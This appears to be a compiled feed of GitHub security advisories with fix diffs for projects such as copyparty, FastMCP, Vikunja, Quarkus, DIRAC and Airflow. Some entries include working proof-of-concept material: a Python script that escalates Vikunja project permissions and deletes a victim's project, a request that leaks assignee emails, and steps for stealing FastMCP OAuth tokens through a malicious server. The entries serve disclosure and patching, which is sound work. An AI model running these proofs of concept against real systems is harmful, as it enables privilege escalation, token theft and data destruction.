@@ -1,0 +1,739 @@
+=== GHSA-pxvw-4w88-6x95 sev=medium pkgs=['pip:copyparty']
+src=https://github.com/9001/copyparty cwes=['CWE-552', 'CWE-862']
+SUMMARY: copyparty: Sharing a single file does not fully restrict access to other files in source folder
+DESC: There was a missing permission-check in the shares feature (the `shr` global-option). When a share is created for just one file inside a folder, it was possible to access the other files inside that folder by guessing the filenames. It was not possible to descend into subdirectories in this manner; only the sibling files were accessible. This issue did not affect filekeys or dirkeys.
+FIX commit https://github.com/9001/copyparty/commit/e0a92ba72d46074209a9c304eb2a01ca0429e60c status=200
+  MSG: fence fileshares to just those files when a share is created for just a single file, it was possible to guess other filenames in the source folder and access those files
+  FILE copyparty/authsrv.py
+    +        self.canonical = self._canonical
+    +        self.dcanonical = self._dcanonical
+    -    def canonical(self, rem: str, resolve: bool = True) -> str:
+    +    def _canonical(self, rem: str, resolve: bool = True) -> str:
+    -    def dcanonical(self, rem: str) -> str:
+    +    def _dcanonical(self, rem: str) -> str:
+    +    def _canonical_shr(self, rem: str, resolve: bool = True) -> str:
+    +        """returns the canonical path (fully-resolved absolute fs path)"""
+    +        ap = self.realpath
+    +        if rem:
+    +            ap += "/" + rem
+    +        rap = absreal(ap)
+    +        if self.shr_files:
+    +            assert self.shr_src  # !rm
+    +            vn, rem = self.shr_src
+    +            chk = absreal(os.path.join(vn.realpath, rem))
+    +            if chk != rap:
+    +                # not the dir itself; assert file allowed
+    +                ad, fn = os.path.split(rap)
+    +                if chk != ad or fn not in self.shr_files:
+    +                    return "\n\n"
+    +        return rap if resolve else ap
+    +    def _dcanonical_shr(self, rem: str) -> str:
+    +        """resolves until the final component (filename)"""
+    +        ap = self.realpath
+    +        if rem:
+    +            ap += "/" + rem
+    +        ad, fn = os.path.split(ap)
+    +        ad = absreal(ad)
+    +        if self.shr_files:
+
+=== GHSA-gqp3-hfc3-8q54 sev=low pkgs=['go:github.com/usememos/memos']
+src=https://github.com/usememos/memos cwes=['CWE-266']
+SUMMARY: Memos has an Incorrect Privilege Assignment issue
+DESC: A weakness has been identified in usememos memos up to 0.22.1. This affects the function memos_access_token of the file src/App.tsx of the component UpdateInstanceSetting. This manipulation of the argument additionalStyle/additionalScript causes improper authorization. The attack is possible to be carried out remotely. The exploit has been made available to the public and could be used for attacks. The vendor was contacted early about this disclosure but did not respond in any way.
+
+=== GHSA-q62f-h9x2-gcqc sev=high pkgs=['maven:org.springframework.ai:spring-ai-advisors-vector-store', 'maven:org.springframework.ai:spring-ai-client-chat', 'maven:org.springframework.ai:spring-ai-model']
+src= cwes=['CWE-276']
+SUMMARY: Spring AI: ChatMemory DEFAULT_CONVERSATION_ID causes unintended cross-user data leakage
+DESC: Spring AI's chat memory component contained a problematic default that, when not explicitly overridden, could result in unintended data exposure between users.
+
+=== GHSA-5h2m-4q8j-pqpj sev=high pkgs=['pip:fastmcp']
+src=https://github.com/PrefectHQ/fastmcp cwes=['CWE-863']
+SUMMARY: FastMCP OAuth Proxy token reuse across MCP servers
+DESC: While testing the OAuth Proxy implementation, it was noticed that the server does not properly respect the `resource` parameter submitted by the client in the authorization and token request. Instead of issuing the token explicitly for this MCP server, the token is issued for the `base_url` passed to the `OAuthProxy` during initialization. **Affected File:** *https://github.com/jlowin/fastmcp/blob/main/src/fastmcp/server/auth/oauth_proxy.py#L828* **Affected Code:** ```python self._jwt_issuer: JWTIssuer = JWTIssuer( issuer=str(self.base_url), audience=f"{str(self.base_url).rstrip('/')}/mcp", signing_key=jwt_signing_key, ) ``` Since the issued access and refresh tokens do not include information about the resource the token was issued for, it is impossible for the MCP server to properly verify whether the token was issued for it, hence violating the requirement of doing so demanded by the [specification](https://mcp.mintlify.app/specification/2025-11-25/basic/authorization#token-audience-binding-and-validation). Being able to verify whether the token was issued for the target MCP server enforces the protections offered by the steps proposed by the specification and the Resource Indicators OAuth extension. Therefore, this misconfiguration exposes all MCP server setups using the FastMCP OAuth Proxy to an attack where an adversary creates a malicious MCP server that advertises the benign OAuth Proxy authorization server as its own authorization server. Once a victim completes an OAuth flow with this malicious MCP server, authenticating against the AS, the adversary can extract the token received at the malicious MCP server and use it to access other MCP servers (the benign ones) that also use the same AS, including the tools and resources they expose. **Steps to reproduce:** 1. Extract the provided [PoC environment](https://github.com/user-attachments/files/23839983/improper_resource_validation_fastmcp.tgz). 2. Enter the *client_id* and *client_secret* of a GitHub App you control into the `mcp-server-proxy.py` script. 3. Start the benign MCP server using an OAuth Proxy (in this case the *GitHubProvider*): `python3 mcp-server-proxy.py`. 4. Start the malicious AS: `python3 mal_auth_server.py`. 5. Start the malicious MCP server: `python3 attacker_server.py`. 6. Connect the client to the malicious MCP server: `python3 client.py`. 7. Complete the OAuth flow. 8. Observe in the logs of the malicious MCP server that the request to the benign MCP server with the stolen token returned a 200 status code. ## Impact This vulnerability allows an adversary to steal a victim’s authentication material for a benign MCP server using the FastMCP OAuth Proxy. The severity of this issue was decreased to _Medium_ due to the consent screen showing the name of the MCP server the OAuth Proxy was intended for. However, a victim might not see it or get otherwise convinced by the attacker to ignore it, and overall this does not act as a proper mitigation for this issue. ## Mitigation To mitigate this vulnerability, it is recommended to issue tokens specifically for the MCP server submitted in the authorization URL’s `resource` GET parameter. In this way, the receiving MCP server will be able to properly verify that the token was indeed issued for it, allowing it to reject tokens stolen by an attack like the one demonstrated above.
+
+=== GHSA-vpgr-cwfx-pwfw sev=medium pkgs=['composer:concrete5/concrete5']
+src=https://github.com/concretecms/concretecms cwes=['CWE-284']
+SUMMARY: Concrete CMS is vulnerable to unauthenticated page metadata disclosure
+DESC: Concrete CMS 9.5.0 and below is vulnerable to unauthenticated page metadata disclosure across every page with a configured summary template, revealing the existence of private, draft, and restricted pages while leaking title, path, description, and author information.
+
+=== GHSA-8wvg-r2j4-3737 sev=medium pkgs=['go:code.vikunja.io/api']
+src=https://github.com/go-vikunja/vikunja cwes=['CWE-200']
+SUMMARY: Vikunja: Assignee email addresses disclosed to read-only project members via the task assignees endpoint
+DESC: ### Summary `TaskAssginee.ReadAll` returns assignee user objects without blanking the `Email` field, disclosing assignee email addresses to any read-only project member. Every sibling path that returns user objects obfuscates the email; this one does not. ### Details `pkg/models/task_assignees.go` (~lines 306-344) does `Select("users.*")` and returns the result directly. `User.Email` is `json:"email,omitempty"`, so a non-empty value always serializes. The endpoint gates on `task.CanRead`, so a read-only member passes. Sibling paths blank the field: `pkg/models/tasks.go:530`, `pkg/models/project_users.go:216`, `pkg/models/teams.go:177`, `pkg/models/label_task.go:312`, `pkg/models/task_attachment.go:511`. The omission here reads as an oversight, not a decision. The same file's `getRawTaskAssigneesForTasks` (~line 56) also selects `users.*` but is safe because its only caller (`addAssigneesToTasks`) blanks the email afterwards. ### PoC (verified at runtime against v2.5.0, v1 and v2) ``` GET /api/v1/tasks/{id}/assignees (reader with permission:0) -> [{"id":37,"username":"...","email":"assignee+SECRET@example.test", ...}] ``` Same leak on `GET /api/v2/tasks/{id}/assignees` (routes through the identical model method). Contrast: `GET /api/v1/projects/{id}/projectusers` and the project task-embed both return the same users with no email. ### Impact Disclosure of assignees' email addresses to users who should only see usernames. Read-only. ### Fix Blank `Email` on each returned user in `TaskAssginee.ReadAll` before returning, matching the sibling paths. Covers v1 and v2 at once.
+FIX pull https://github.com/go-vikunja/vikunja/pull/3688 status=404
+
+=== GHSA-9623-mj7j-p9v4 sev=medium pkgs=['maven:io.quarkus:quarkus-vertx']
+src=https://github.com/quarkusio/quarkus cwes=['CWE-668']
+SUMMARY: Quarkus potentially leaks data when duplicating a duplicated context
+DESC: ### Impact Vert.x 4.5.12 has changed the semantics of the duplication of duplicated context. Duplicated context is an object used to propagate data through a processing (synchronous or asynchronous). Each "transaction" or "processing" runs on its own isolated duplicated context. Initially, duplicating a duplicated context was creating a fresh (empty) new context, meaning that the new duplicated context can be used to managed a separated transaction. In Vert.x 4.5.12, this semantics has changed, and since the content of the parent duplicated context is copied into the new one, potentially leaking data. This CVE is especially for Quarkus as Quarkus extensively uses the Vert.x duplicated context to implement context propagation. With the new semantic data from one transaction can leak to the data from another transaction. From a Vert.x point of view, this new semantic clarifies the behavior. A significant amount of data is stored in the duplicated context, including request scope, security details, and metadata. Duplicating a duplicated context is rather rare and is only done in a few places: - Quarkus REST Client when using OTel (but it's the same transaction, so no leak) - Quarkus Messaging connectors - Quarkus SmallRye Health (same transaction, so no leak) ### Patches After discussion with the Vert.x team, the change will be rolled back in Vert.x 4.x. A new API will be added to Vert.x 5 do distinguish the 2 cases. ### Workarounds When duplicating a duplicated context, the following code can be done to avoid the potential leak: ```java ((ContextInternal) VertxContext.getRootContext(ctx)).duplicate() ``` This workaround would not be required once the Vert.x version containing the fix will be included. Note that the workaround would still work. ### References This issue have been reported in https://github.com/quarkusio/quarkus/issues/48227.
+FIX commit https://github.com/quarkusio/quarkus/commit/2b58f59f4bf0bae7d35b1abb585b65f2a66787d1 status=200
+  MSG: Merge pull request #48486 from jponge/deps/mutiny-vertx-3.19.1-vertx-4.5.16 Version bumps for Vert.x 4.5.16
+  FILE bom/application/pom.xml
+    -        <smallrye-common.version>2.12.0</smallrye-common.version>
+    +        <smallrye-common.version>2.12.2</smallrye-common.version>
+    -        <smallrye-mutiny-vertx-binding.version>3.19.0</smallrye-mutiny-vertx-binding.version>
+    +        <smallrye-mutiny-vertx-binding.version>3.19.1</smallrye-mutiny-vertx-binding.version>
+    -        <vertx.version>4.5.14</vertx.version>
+    +        <vertx.version>4.5.16</vertx.version>
+  FILE docs/src/main/asciidoc/messaging.adoc
+    -<<internal-channels>> however do propagate the context, as they are part of the same application and the context is not lost.
+    +=== Context Propagation with Emitters
+    -For example, you might want to propagate the caller context from an incoming HTTP request to the message processing stage.
+    -For emitters, it is recommended to use the `MutinyEmitter`, as it exposes methods such as `sendAndAwait` that makes sure to wait until a message processing is 
+    +When using messaging emitters, the context is not propagated by default.
+    -[WARNING]
+    -====
+    -The execution context to which the RequestScoped context is bound, in the previous example the REST call, controls the lifecycle of the context.
+    -This means that when the REST call is completed the RequestScoped context is destroyed.
+    -Therefore, you need to make sure that your processing or message dispatch is completed before the REST call completes.
+    +In some scenarios, you might want to propagate the caller context to the message processing stage, using <<internal-channels,internal channels>>.
+    -For more information check the xref:context-propagation.adoc#context-propagation-for-cdi[Context Propagation] guide.
+    -====
+    +Quarkus provides `ContextualEmitter`, a drop in replacement for `MutinyEmitter` and `Emitter`, that allows you to propagate the context when sending messages.
+    +You can use the context propagation annotation `@CurrentThreadContext` to configure the contexts that will be propagated from an _emitter_ method.
+    +The annotation configures the contexts that will be captured and propagated from that method,
+    +and needs to be present on the propagator method, i.e. the caller of the emitter, not the processing method.
+    -For example, let `RequestScopedBean` a request-scoped bean, `MutinyEmitter` can be used to dispatch messages locally through the internal channel `app`:
+    +Let `RequestScopedBean` a request-scoped bean, `ContextualEmitter` can be used to dispatch messages locally through the internal channel `app`:
+    -import io.smallrye.reactive.messaging.MutinyEmitter;
+    -import io.smallrye.mutiny.Uni;
+    -import io.vertx.core.Context;
+    -import io.vertx.core.Vertx;
+    +import io.quarkus.smallrye.reactivemessaging.runtime.ContextualEmitter;
+  FILE extensions/smallrye-reactive-messaging/runtime/src/main/java/io/quarkus/smallrye/reactivemessaging/runtime/ContextualEmitterImpl.java
+  FILE extensions/vertx-http/runtime/src/main/java/io/quarkus/vertx/http/runtime/filters/AbstractResponseWrapper.java
+  FILE independent-projects/resteasy-reactive/pom.xml
+  FILE independent-projects/vertx-utils/pom.xml
+  FILE integration-tests/reactive-messaging-context-propagation/src/test/java/io/quarkus/it/kafka/KafkaContextPropagationTest.java
+FIX pull https://github.com/quarkusio/quarkus/pull/48486 status=200
+  (same commit message as a fix above; diff not repeated)
+FIX commit https://github.com/quarkusio/quarkus/commit/31e8a3bfcf4e223788615d5ce25eb929ca251275 status=200
+  MSG: Backport of #48486 on 3.20 Also include Mutiny and Netty alignments.
+  FILE bom/application/pom.xml
+    -        <smallrye-common.version>2.12.0</smallrye-common.version>
+    +        <smallrye-common.version>2.12.2</smallrye-common.version>
+    -        <smallrye-mutiny-vertx-binding.version>3.18.1</smallrye-mutiny-vertx-binding.version>
+    -        <smallrye-reactive-messaging.version>4.27.0</smallrye-reactive-messaging.version>
+    +        <smallrye-mutiny-vertx-binding.version>3.19.1</smallrye-mutiny-vertx-binding.version>
+    +        <smallrye-reactive-messaging.version>4.28.0</smallrye-reactive-messaging.version>
+    -        <vertx.version>4.5.14</vertx.version>
+    +        <vertx.version>4.5.16</vertx.version>
+    -        <netty.version>4.1.119.Final</netty.version>
+    +        <netty.version>4.1.121.Final</netty.version>
+    -        <mutiny.version>2.8.0</mutiny.version>
+    +        <mutiny.version>2.9.2</mutiny.version>
+  FILE extensions/vertx-http/runtime/src/main/java/io/quarkus/vertx/http/runtime/filters/AbstractResponseWrapper.java
+    +    @Override
+    +    public Future<Void> writeHead() {
+    +        return delegate.writeHead();
+    +    }
+  FILE independent-projects/arc/pom.xml
+    -        <version.mutiny>2.8.0</version.mutiny>
+    +        <version.mutiny>2.9.2</version.mutiny>
+  FILE independent-projects/qute/pom.xml
+    -        <version.smallrye-mutiny>2.8.0</version.smallrye-mutiny>
+    +        <version.smallrye-mutiny>2.9.2</version.smallrye-mutiny>
+  FILE independent-projects/resteasy-reactive/pom.xml
+    -        <mutiny.version>2.8.0</mutiny.version>
+    +        <mutiny.version>2.9.2</mutiny.version>
+    -        <vertx.version>4.5.14</vertx.version>
+    +        <vertx.version>4.5.16</vertx.version>
+    -        <awaitility.version>4.2.2</awaitility.version>
+    -        <smallrye-mutiny-vertx-core.version>3.18.1</smallrye-mutiny-vertx-core.version>
+    +        <awaitility.version>4.3.0</awaitility.version>
+    +        <smallrye-mutiny-vertx-core.version>3.19.1</smallrye-mutiny-vertx-core.version>
+  FILE independent-projects/vertx-utils/pom.xml
+    -        <vertx.version>4.5.14</vertx.version>
+    +        <vertx.version>4.5.16</vertx.version>
+
+=== GHSA-38f7-945m-qr2g sev=high pkgs=['npm:effect']
+src=https://github.com/Effect-TS/effect cwes=['CWE-362']
+SUMMARY: Effect `AsyncLocalStorage` context lost/contaminated inside Effect fibers under concurrent load with RPC
+DESC: ## Versions - `effect`: 3.19.15 - `@effect/rpc`: 0.72.1 - `@effect/platform`: 0.94.2 - Node.js: v22.20.0 - Vercel runtime with Fluid compute - Next.js: 16 (App Router) - `@clerk/nextjs`: 6.x ## Root cause Effect's `MixedScheduler` batches fiber continuations and drains them inside a **single** microtask or timer callback. The `AsyncLocalStorage` context active during that callback belongs to whichever request first triggered the scheduler's drain cycle — **not** the request that owns the fiber being resumed. ### Detailed mechanism #### 1. Scheduler batching (`effect/src/Scheduler.ts`, `MixedScheduler`) ```typescript // MixedScheduler.starve() — called once when first task is scheduled private starve(depth = 0) { if (depth >= this.maxNextTickBeforeTimer) { setTimeout(() => this.starveInternal(0), 0) // timer queue } else { Promise.resolve(void 0).then(() => this.starveInternal(depth + 1)) // microtask queue } } // MixedScheduler.starveInternal() — drains ALL accumulated tasks in one call private starveInternal(depth: number) { const tasks = this.tasks.buckets this.tasks.buckets = [] for (const [_, toRun] of tasks) { for (let i = 0; i < toRun.length; i++) { toRun[i]() // ← Every fiber continuation runs in the SAME ALS context } } // ... } ``` `scheduleTask` only calls `starve()` when `running` is `false`. Subsequent tasks accumulate in `this.tasks` until `starveInternal` drains them all. The `Promise.then()` (or `setTimeout`) callback inherits the ALS context from whichever call site created it — i.e., whichever request's fiber first set `running = true`. **Result:** Under concurrent load, fiber continuations from Request A and Request B execute inside the same `starveInternal` call, sharing a single ALS context. If Request A triggered `starve()`, then Request B's fiber reads Request A's ALS context. #### 2. `toWebHandlerRuntime` does not propagate ALS (`@effect/platform/src/HttpApp.ts:211-240`) ```typescript export const toWebHandlerRuntime = <R>(runtime: Runtime.Runtime<R>) => { const httpRuntime: Types.Mutable<Runtime.Runtime<R>> = Runtime.make(runtime) const run = Runtime.runFork(httpRuntime) return <E>(self: Default<E, R | Scope.Scope>, middleware?) => { return (request: Request, context?): Promise<Response> => new Promise((resolve) => { // Per-request Effect context is correctly set via contextMap: const contextMap = new Map<string, any>(runtime.context.unsafeMap) const httpServerRequest = ServerRequest.fromWeb(request) contextMap.set(ServerRequest.HttpServerRequest.key, httpServerRequest) httpRuntime.context = Context.unsafeMake(contextMap) // But the fiber is forked without any ALS propagation: const fiber = run(httpApp as any) // ← ALS context is NOT captured or restored }) } } ``` Effect's own `Context` (containing `HttpServerRequest`) is correctly set per-request. But the **Node.js ALS context** — which frameworks like Next.js, Clerk, and OpenTelemetry rely on — is not captured at fork time or restored when the fiber's continuations execute. #### 3. The dangerous pattern this enables ```typescript // RPC handler — runs inside an Effect fiber const handler = Effect.gen(function*() { // This calls auth() from @clerk/nextjs/server, which reads from ALS const { userId } = yield* Effect.tryPromise({ try: async () => auth(), // ← may read WRONG user's session catch: () => new UnauthorizedError({ message: "Auth failed" }) }) return yield* repository.getUser(userId) }) ``` The `async () => auth()` thunk executes when the fiber continuation is scheduled by `MixedScheduler`. At that point, the ALS context belongs to an arbitrary concurrent request. ## Reproduction scenario ``` Timeline (two concurrent requests to the same toWebHandler endpoint): T0: Request A arrives → POST handler → webHandler(requestA) → Promise executor runs synchronously → httpRuntime.context set to A's context → fiber A forked, runs first ops synchronously → fiber A yields (e.g., at Effect.tryPromise boundary) → scheduler.scheduleTask(fiberA_continuation) → running=false → starve() called → Promise.resolve().then(drain) ↑ ALS context captured = Request A's context T1: Request B arrives → POST handler → webHandler(requestB) → Promise executor runs synchronously → httpRuntime.context set to B's context → fiber B forked, runs first ops synchronously → fiber B yields → scheduler.scheduleTask(fiberB_continuation) → running=true → task queued, no new starve() T2: Microtask fires → starveInternal() runs → Drains fiberA_continuation → auth() reads ALS → gets A's context ✓ → Drains fiberB_continuation → auth() reads ALS → gets A's context ✗ ← WRONG USER ``` ## Minimal reproduction ```typescript import { AsyncLocalStorage } from "node:async_hooks" import { Effect, Layer } from "effect" import { RpcServer, RpcSerialization, Rpc, RpcGroup } from "@effect/rpc" import { HttpServer } from "@effect/platform" import * as S from "effect/Schema" // Simulate a framework's ALS (like Next.js / Clerk) const requestStore = new AsyncLocalStorage<{ userId: string }>() class GetUser extends Rpc.make("GetUser", { success: S.Struct({ userId: S.String, alsUserId: S.String }), failure: S.Never, payload: {} }) {} const MyRpc = RpcGroup.make("MyRpc").add(GetUser) const MyRpcLive = MyRpc.toLayer( RpcGroup.toHandlers(MyRpc, { GetUser: () => Effect.gen(function*() { // Simulate calling an ALS-dependent API inside an Effect fiber const alsResult = yield* Effect.tryPromise({ try: async () => { const store = requestStore.getStore() return store?.userId ?? "NONE" }, catch: () => { throw new Error("impossible") } }) return { userId: "from-effect-context", alsUserId: alsResult } }) }) ) const RpcLayer = MyRpcLive.pipe( Layer.provideMerge(RpcSerialization.layerJson), Layer.provideMerge(HttpServer.layerContext) ) const { handler } = RpcServer.toWebHandler(MyRpc, { layer: RpcLayer }) // Simulate two concurrent requests with different ALS contexts async function main() { const results = await Promise.all([ requestStore.run({ userId: "user-A" }, () => handler(mak [...]
+
+=== GHSA-2vq4-854f-5c72 sev=high pkgs=['go:code.vikunja.io/api']
+src=https://github.com/go-vikunja/vikunja cwes=['CWE-269']
+SUMMARY: Vikunja vulnerable to Privilege Escalation via Project Reparenting
+DESC: ## Summary A user with Write-level access to a project can escalate their permissions to Admin by moving the project under a project they own. After reparenting, the recursive permission CTE resolves ownership of the new parent as Admin on the moved project. The attacker can then delete the project, manage shares, and remove other users' access. ## Details The `CanUpdate` check at `pkg/models/project_permissions.go:139-148` only requires `CanWrite` on the new parent project when changing `parent_project_id`. However, Vikunja's permission model uses a recursive CTE that walks up the project hierarchy to compute permissions. Moving a project under a different parent changes the permission inheritance chain. When a user has inherited Write access (from a parent project share) and reparents the child project under their own project tree, the CTE resolves their ownership of the new parent as Admin (permission level 2) on the moved project. ```go if p.ParentProjectID != 0 && p.ParentProjectID != ol.ParentProjectID { newProject := &Project{ID: p.ParentProjectID} can, err := newProject.CanWrite(s, a) // Only checks Write, not Admin if err != nil { return false, err } if !can { return false, ErrGenericForbidden{} } } ``` ## Proof of Concept Tested on Vikunja v2.2.2. ``` 1. victim creates "Parent Project" (id=3) 2. victim creates "Secret Child" (id=4) under Parent Project 3. victim shares Parent Project with attacker at Write level (permission=1) -> attacker inherits Write on Secret Child (no direct share) 4. attacker creates own "Attacker Root" project (id=5) 5. attacker verifies: DELETE /api/v1/projects/4 -> 403 Forbidden 6. attacker sends: POST /api/v1/projects/4 {"title":"Secret Child","parent_project_id":5} -> 200 OK (reparenting succeeds, only requires Write) 7. attacker sends: DELETE /api/v1/projects/4 -> 200 OK -> Project deleted. victim gets 404. ``` ```python import requests TARGET = "http://localhost:3456" API = f"{TARGET}/api/v1" def login(u, p): return requests.post(f"{API}/login", json={"username": u, "password": p}).json()["token"] def h(token): return {"Authorization": f"Bearer {token}", "Content-Type": "application/json"} victim_token = login("victim", "Victim123!") attacker_token = login("attacker", "Attacker123!") # victim creates parent -> child project hierarchy parent = requests.put(f"{API}/projects", headers=h(victim_token), json={"title": "Parent Project"}).json() child = requests.put(f"{API}/projects", headers=h(victim_token), json={"title": "Secret Child", "parent_project_id": parent["id"]}).json() # victim shares parent with attacker at Write (attacker inherits Write on child) requests.put(f"{API}/projects/{parent['id']}/users", headers=h(victim_token), json={"username": "attacker", "permission": 1}) # attacker creates own root project own = requests.put(f"{API}/projects", headers=h(attacker_token), json={"title": "Attacker Root"}).json() # before: attacker cannot delete child r = requests.delete(f"{API}/projects/{child['id']}", headers=h(attacker_token)) print(f"DELETE before reparent: {r.status_code}") # 403 # exploit: reparent child under attacker's project r = requests.post(f"{API}/projects/{child['id']}", headers=h(attacker_token), json={"title": "Secret Child", "parent_project_id": own["id"]}) print(f"Reparent: {r.status_code}") # 200 # after: attacker can now delete child r = requests.delete(f"{API}/projects/{child['id']}", headers=h(attacker_token)) print(f"DELETE after reparent: {r.status_code}") # 200 - escalated to Admin # victim lost access r = requests.get(f"{API}/projects/{child['id']}", headers=h(victim_token)) print(f"Victim access: {r.status_code}") # 404 - project gone ``` Output: ``` DELETE before reparent: 403 Reparent: 200 DELETE after reparent: 200 Victim access: 404 ``` The attacker escalated from inherited Write to Admin by reparenting, then deleted the victim's project. ## Impact Any user with Write permission on a shared project can escalate to full Admin by moving the project under their own project tree via a single API call. After escalation, the attacker can delete the project (destroying all tasks, attachments, and history), remove other users' access, and manage sharing settings. This affects any project where Write access has been shared with collaborators. ## Recommended Fix Require Admin permission instead of Write when changing `parent_project_id`: ```go if p.ParentProjectID != 0 && p.ParentProjectID != ol.ParentProjectID { newProject := &Project{ID: p.ParentProjectID} can, err := newProject.IsAdmin(s, a) if err != nil { return false, err } if !can { return false, ErrGenericForbidden{} } canAdmin, err := p.IsAdmin(s, a) if err != nil { return false, err } if !canAdmin { return false, ErrGenericForbidden{} } } ``` --- *Found and reported by [aisafe.io](https://aisafe.io)*
+FIX pull https://github.com/go-vikunja/vikunja/pull/2583 status=404
+FIX commit https://github.com/go-vikunja/vikunja/commit/c03d682f48aff890eeb3c8b41d38226069722827 status=200
+  MSG: test(project): fix ParadeDB search expectation for fixture child The TestProject_ReadAll/search case on the ParadeDB path was still expecting 6 results, but adding fixture project 43 (child of project
+  FILE pkg/models/project_test.go
+    -			require.Len(t, ls, 6)
+    +			// The recursive CTE also pulls in project 43 as a child of the
+    +			// matched project 10 (reparent-escalation fixture).
+    +			require.Len(t, ls, 7)
+    +			assert.Contains(t, projectIDs, int64(43))
+
+=== GHSA-59qj-jcjv-662j sev=critical pkgs=['pip:DIRAC', 'pip:dirac']
+src=https://github.com/DIRACGrid/DIRAC cwes=['CWE-200']
+SUMMARY: DIRAC's TokenManager does not check permissions on cached tokens
+DESC: ### Impact Any user could get a token that has been requested by another user/agent ### Patches The vulnerability is fixed in version 8.0.37. ### Workarounds None ### References
+FIX commit https://github.com/DIRACGrid/DIRAC/commit/9487921684e2925b4cf72d6c423718cf4950f3fe status=200
+  MSG: Merge pull request from GHSA-59qj-jcjv-662j [integration] Remove server side cache in TokenManager
+  FILE src/DIRAC/FrameworkSystem/Service/TornadoTokenManagerHandler.py
+    -The service and its client have a mechanism for caching the received tokens.
+    +The client has a mechanism for caching the received tokens.
+    -It in turn checks the cache and if the ``access token`` is already invalid tries to update it using a ``refresh token``.
+    -If the required token is not in the cache, then the ``refresh token`` from :py:class:`TokenDB <DIRAC.FrameworkSystem.DB.TokenDB.TokenDB>`
+    -is taken and the **exchange token** request to Identity Provider is made. The received tokens are cached.
+    +The ``refresh token`` from :py:class:`TokenDB <DIRAC.FrameworkSystem.DB.TokenDB.TokenDB>`
+    +is taken and the **exchange token** request to Identity Provider is made.
+    -# Used to synchronize the cache with user tokens
+    -gTokensSync = ThreadSafe.Synchronizer()
+    -        # Cache containing tokens from scope requested by the client
+    -        cls.__tokensCache = DictCache()
+    -    @gTokensSync
+    -        # Search for an existing token in tokensCache
+    -        cachedKey = getCachedKey(idpObj, username, userGroup, scope, audience)
+    -        result = getCachedToken(self.__tokensCache, cachedKey, requiredTimeLeft)
+    -        if result["OK"]:
+    -            # A valid token has been found and is returned
+    -            return result
+    +        # getCachedKey is just used here to resolve the default scopes
+    +        _, scope, *_ = getCachedKey(idpObj, username, userGroup, scope, audience)
+    -            scope = cachedKey[1]
+    -            audience = cachedKey[2]
+    -            if not result["OK"]:
+    -                return result
+    -            token = result["Value"]
+    -            # Caching new token: only get an access token (no refresh token in this context)
+    -            self.__tokensCache.add(
+    -                cachedKey,
+    -                result["Value"].get_claim("exp", "access_token") or DEFAULT_AT_EXPIRATION_TIME,
+    -                token,
+FIX commit https://github.com/DIRACGrid/DIRAC/commit/f9ddab755b9a69acb85e14d2db851d8ac0c9648c status=200
+  MSG: Merge pull request from GHSA-59qj-jcjv-662j [8.0] Remove server side cache in TokenManager
+  FILE src/DIRAC/FrameworkSystem/Service/TokenManagerHandler.py
+    -The service and its client have a mechanism for caching the received tokens.
+    +The client has a mechanism for caching the received tokens.
+    -It in turn checks the cache and if the ``access token`` is already invalid tries to update it using a ``refresh token``.
+    -If the required token is not in the cache, then the ``refresh token`` from :py:class:`TokenDB <DIRAC.FrameworkSystem.DB.TokenDB.TokenDB>`
+    -is taken and the **exchange token** request to Identity Provider is made. The received tokens are cached.
+    +The ``refresh token`` from :py:class:`TokenDB <DIRAC.FrameworkSystem.DB.TokenDB.TokenDB>`
+    +is taken and the **exchange token** request to Identity Provider is made.
+    -    getCachedToken,
+    -# Used to synchronize the cache with user tokens
+    -gTokensSync = ThreadSafe.Synchronizer()
+    -        # Cache containing tokens from scope requested by the client
+    -        cls.__tokensCache = DictCache()
+    -    @gTokensSync
+    -        # Search for an existing token in tokensCache
+    -        cachedKey = getCachedKey(idpObj, username, userGroup, scope, audience)
+    -        result = getCachedToken(self.__tokensCache, cachedKey, requiredTimeLeft)
+    -        if result["OK"]:
+    -            # A valid token has been found and is returned
+    -            return result
+    +        # getCachedKey is just used here to resolve the default scopes
+    +        _, scope, *_ = getCachedKey(idpObj, username, userGroup, scope, audience)
+    -            scope = cachedKey[1]
+    -            audience = cachedKey[2]
+    -            if not result["OK"]:
+    -                return result
+    -            token = result["Value"]
+    -            # Caching new token: only get an access token (no refresh token in this context)
+    -            self.__tokensCache.add(
+    -                cachedKey,
+    -                result["Value"].get_claim("exp", "access_token") or DEFAULT_AT_EXPIRATION_TIME,
+
+=== GHSA-f899-4mr4-fqpv sev=low pkgs=['go:github.com/apache/incubator-answer']
+src=https://github.com/apache/incubator-answer cwes=['CWE-362']
+SUMMARY: Apache Answer Race Condition vulnerability
+DESC: Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition') vulnerability in Apache Answer. This issue affects Apache Answer: through 1.2.0. Under normal circumstances, a user can only bookmark a question once, and will only increase the number of questions bookmarked once. However, repeat submissions through the script can increase the number of collection of the question many times. Users are recommended to upgrade to version [1.2.1], which fixes the issue.
+
+=== GHSA-vr7m-c6v4-8cx8 sev=medium pkgs=['pip:apache-airflow']
+src=https://github.com/apache/airflow cwes=['CWE-613']
+SUMMARY: Apache Airflow: Auth manager doesn't invalidate JWT tokens after users click logout
+DESC: A bug in Apache Airflow's auth manager logout handling left previously-issued JWT tokens valid after the user clicked logout in the UI: the logout flow for `FabAuthManager` and `KeycloakAuthManager` did not actually reach the underlying `revoke_token()` call, so the JWT remained accepted by the API server until its natural expiry. An attacker holding a previously-issued JWT for a logged-out user could continue to make authenticated API calls as that user. Affects deployments configured with `FabAuthManager` or `KeycloakAuthManager` (the bug does not affect SimpleAuthManager). This is a residual gap in the fix for CVE-2025-57735, which addressed cookie-side invalidation in PR #57992 / PR #61339 but did not cover the provider-side `revoke_token()` reachability in the FAB / Keycloak code paths. Users who already upgraded for CVE-2025-57735 should additionally upgrade to `apache-airflow` 3.2.2 or later to cover the FAB / Keycloak logout paths.
+FIX pull https://github.com/apache/airflow/pull/67289 status=200
+  PR: Revoke JWT on /auth/logout regardless of auth manager logout URL | The `/auth/logout` endpoint previously short-circuited via early return when an auth manager's `get_url_logout()` returned a URL, and `auth_manager.revoke_token(token_str)` was never called. Move the `revoke_token` call before the early return so logout reliably invalidates the JWT token regardless of which auth manager is configured. Both branches are covered by tests: - `test_logout_revokes_toke
+  MSG: Revoke JWT on /auth/logout regardless of auth manager logout URL (#67289) Previously, when an auth manager's get_url_logout() returned a URL, the /auth/logout endpoint short-circuited via early return
+  FILE airflow-core/src/airflow/api_fastapi/core_api/routes/public/auth.py
+    +    # Revoke the current token before any redirect or cookie deletion so the JWT
+    +    # is invalidated even when the auth manager redirects to an external logout URL.
